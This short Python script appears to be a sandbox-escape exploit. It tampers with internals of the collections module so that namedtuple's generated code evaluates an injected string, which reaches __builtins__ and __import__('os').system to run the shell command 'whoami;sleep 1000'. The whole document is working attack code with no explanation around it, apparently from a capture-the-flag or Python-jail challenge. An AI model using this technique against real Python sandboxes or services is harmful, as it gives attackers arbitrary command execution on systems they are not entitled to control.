from collections import namedtuple, _collections_abc
_collections_abc.__all__ = ["_type_repr", "_check_methods", "ABCMeta", "tuple"]
from collections import _check_methods, ABCMeta
XC = ABCMeta("XC", (), {"__new__": _check_methods})
_collections_abc.NotImplemented = [
    'a: 1,_tuple_new.__globals__["__builtins__"]["__import__"]("os").system("whoami;sleep 1000")#'
]
_collections_abc.tuple = XC
from collections import tuple
namedtuple('x', [])
